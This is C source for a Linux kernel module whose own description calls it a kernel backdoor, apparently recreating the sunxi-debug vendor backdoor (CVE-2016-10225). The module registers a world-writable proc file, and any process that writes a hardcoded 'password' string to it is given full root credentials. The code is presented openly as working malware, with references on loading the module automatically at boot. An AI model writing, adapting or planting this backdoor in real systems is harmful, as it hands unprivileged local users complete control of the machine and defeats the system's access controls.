#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/export.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/slab.h>

#define KERN_PROCROOT "mod"
#define KERN_PROCFILE "bdm"  // /proc/KERN_PROCROOT/KERN_PROCFILE
#define KERN_PASSWORD "password"

static ssize_t mymodule_write(struct file *, const char __user *, size_t, loff_t *);
static ssize_t mymodule_read(struct file *, char __user *, size_t, loff_t *);
static int mymodule_open(struct inode *, struct file *);
static int mymodule_procfs_attach(void);
static int __init mymodule_init(void);
static void __exit mymodule_exit(void);

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_file;
static const struct file_operations proc_fops = {
    .open= mymodule_open,
    .read= mymodule_read,
    .write = mymodule_write,
};

MODULE_LICENSE("GPL");
MODULE_AUTHOR("sunxi-debug");
MODULE_DESCRIPTION("Adds a backdoor to the linux kernel");

static ssize_t
mymodule_write(struct file *file, const char __user *buffer, size_t count, loff_t *data)
{
    char *kbuf;
    struct cred *cred;
    static struct task_struct *task;

    if (count < 1)
        return -EINVAL;

    kbuf = kmalloc(count, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    if (copy_from_user(kbuf, buffer, count)) {
        kfree(kbuf);
        return -EFAULT;
    }

    if(!strncmp(KERN_PASSWORD,(char*)kbuf, strlen(KERN_PASSWORD))){
        task = get_current();

        cred = (struct cred *)__task_cred(task);
        cred->uid = GLOBAL_ROOT_UID;
        cred->gid = GLOBAL_ROOT_GID;
        cred->suid = GLOBAL_ROOT_UID;
        cred->euid = GLOBAL_ROOT_UID;
        cred->euid = GLOBAL_ROOT_UID;
        cred->egid = GLOBAL_ROOT_GID;
        cred->fsuid = GLOBAL_ROOT_UID;
        cred->fsgid = GLOBAL_ROOT_GID;

        printk(KERN_WARNING "Module is installed successfully\n");
    }

    kfree(kbuf);
    return count;
}

static ssize_t
mymodule_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
{
    return 0;
}

static int
mymodule_open(struct inode *inode, struct file *file)
{
    return 0;
}

static int
mymodule_procfs_attach(void)
{
    proc_root = proc_mkdir(KERN_PROCROOT, NULL);
    proc_file = proc_create(KERN_PROCFILE, 0666, proc_root, &proc_fops);

    printk(KERN_INFO "proc_create successfully\n");

    if (IS_ERR(proc_file)){
        printk(KERN_ERR "proc_create failed\n");
        return -1;
    }

    return 0;
}

static int
__init mymodule_init(void)
{
    int ret;

    printk(KERN_INFO "module __init\n");

    ret = mymodule_procfs_attach();
    if(ret){
        printk(KERN_INFO "module __init failed\n ");
    }
    return ret;
}

static void
__exit mymodule_exit(void)
{
    printk(KERN_INFO "module __exit\n");

    remove_proc_entry(KERN_PROCFILE, proc_root);
    remove_proc_entry(KERN_PROCROOT, NULL);
}

module_init(mymodule_init);
module_exit(mymodule_exit);

// References
// https://elixir.bootlin.com/linux/v4.0/source/fs/proc/generic.c#L523
// https://github.com/rapid7/metasploit-framework/issues/6869
// https://github.com/allwinner-zh/linux-3.4-sunxi/blob/bd5637f7297c6abf78f93b31fc1dd33f2c1a9f76/arch/arm/mach-sunxi/sunxi-debug.c#L41
// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10225
// https://wiki.archlinux.org/index.php/Kernel_module
// https://www.cyberciti.biz/faq/linux-how-to-load-a-kernel-module-automatically-at-boot-time/

